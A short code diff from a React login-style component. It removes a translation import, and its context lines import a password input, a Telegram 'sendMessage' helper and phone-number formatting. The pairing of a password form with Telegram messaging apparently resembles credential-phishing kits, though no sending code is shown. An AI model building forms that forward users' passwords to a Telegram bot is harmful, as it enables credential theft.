@@ -4,7 +4,6 @@ import PasswordInput from '@/components/password-input';
 import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
-import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
 // 🛡️ THÊM IMPORT CÁC FUNCTION BẢO MẬT
